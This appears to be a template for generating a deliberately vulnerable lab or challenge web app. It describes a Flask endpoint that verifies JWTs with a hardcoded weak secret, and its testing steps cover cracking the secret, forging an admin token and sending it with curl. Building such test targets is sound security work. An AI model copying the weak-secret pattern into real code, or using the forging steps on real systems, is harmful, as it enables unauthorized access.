---
id: jwt_weak_secret
description: Creates a web endpoint protected by a JWT token signed with an easily guessable weak secret.
required_vars: [endpoint_path, weak_secret, required_role]
---

# Atom: JWT Weak Secret
Creates a web application that relies on JSON Web Tokens (JWT) for authentication or authorization but signs them using a guessable secret key. An attacker can crack the secret offline and forge a valid token for arbitrary roles.

### Logic Requirements:
1. Define a web route at `<endpoint_path>` that requires a valid JWT token (usually in the `Authorization: Bearer` header or a cookie).
2. The application must verify the token using a specifically hardcoded, weak secret string: `<weak_secret>`.
3. If the token is valid and contains the claim `{ "role": "<required_role>" }` (or similar privileged condition), the application must grant access to sensitive data or actions.

### Common Patterns:
- **Python (Flask) with pyjwt:**
  ```python
  import jwt
  from flask import Flask, request, jsonify

  app = Flask(__name__)
  app.config['SECRET_KEY'] = '<weak_secret>' # VULNERABILITY: Weak secret used

  @app.route('/<endpoint_path>', methods=['GET'])
  def admin_panel():
      token = request.headers.get('Authorization', '').replace('Bearer ', '')
      try:
          decoded = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
          if decoded.get('role') == '<required_role>':
              return jsonify({"data": "Welcome Admin, here is the secret flag."})
      except jwt.InvalidTokenError:
          pass
      return jsonify({"error": "Unauthorized"}), 401
  ```

### Testing Guidance:
1. Start the target web application.
2. Identify the weak secret by offline cracking using a tool like `john` or `hashcat` against a valid user token, or simply guessing common weak secrets (e.g., "secret", "123456", "password").
3. Generate a forged JWT using the identified `<weak_secret>`. For example, using Python:
   ```bash
   # In attacker context:
   python3 -c "import jwt; print(jwt.encode({'role': '<required_role>'}, '<weak_secret>', algorithm='HS256'))" > /tmp/forged_token.txt
   ```
4. Send a request to the protected endpoint using the forged token:
   ```bash
   curl -H "Authorization: Bearer $(cat /tmp/forged_token.txt)" http://localhost/<endpoint_path>
   ```
5. Verify that access was granted successfully.

### Synthesis Guidance:
Ensure the web application code includes a JWT generation (optional, for the user to get an initial low-privileged token) and a JWT validation mechanism on the target `<endpoint_path>`. The secret must be explicitly set to the provided `<weak_secret>` and should not be dynamically generated with strong entropy. Include the expected role check that the attacker must forge to bypass the authorization check.